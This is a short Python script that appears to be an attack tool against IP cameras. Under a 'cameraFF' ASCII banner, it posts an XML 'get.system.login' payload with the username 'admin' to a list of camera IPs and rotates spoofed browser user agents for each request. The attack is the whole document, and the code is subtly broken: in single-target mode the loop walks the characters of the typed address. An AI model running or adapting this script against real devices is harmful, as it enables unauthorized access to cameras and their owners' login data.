import requests,random

targets = ['192.168.88.20','192.168.88.21']


uas = ['Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4637.0 Mobile Safari/537.36',
       'Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4633.0 Mobile Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.1102.76 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.400.120 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2849.68 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.2797.56 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.1284.16 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.607.72 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.140.14 Safari/537.36',
       'Mozilla/5.0 (Linux; Android 11; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4636.1 Mobile Safari/537.36'
]

payload = '<?xml version="1.0" encoding="utf-8"?><envelope><header><security>username</security><username>admin</username></header><body><command>get.system.login</command><content></content></body></envelope>'


if __name__ == "__main__":
    print(r'''
                                     ______ ______ 
                                    |  ____|  ____|
   ___ __ _ _ __ ___   ___ _ __ __ _| |__  | |__   
  / __/ _` | '_ ` _ \ / _ \ '__/ _` |  __| |  __|  
 | (_| (_| | | | | | |  __/ | | (_| | |    | |     
  \___\__,_|_| |_| |_|\___|_|  \__,_|_|    |_|     
                                                   
4. fxd.unt111ed

    Select mode:

      
      1: All targetsr
      2: Single Target
''')
    s = input()
    if s == '2':
        targets = input('Input camera ip: ')

    session = requests.session()

    for t in targets:
        url = 'http://'+t
        headers = {
            'Host': t,
            'User-Agent': random.choice(uas),
            'Accept': 'application/xml, text/xml, */*; q=0.01',
            'Accept-Language': 'ru-RU,en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://'+t,
            'Content-Length': '244',
            'Origin': 'http://'+t,
            'DNT': '1',
            'Connection': 'keep-alive',
            'Content-Type': 'application/xml',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'
        }
        response = session.post(url, data=payload, headers=headers, allow_redirects=True, verify=False)
        print(f'[{t}] - {response.status_code}')
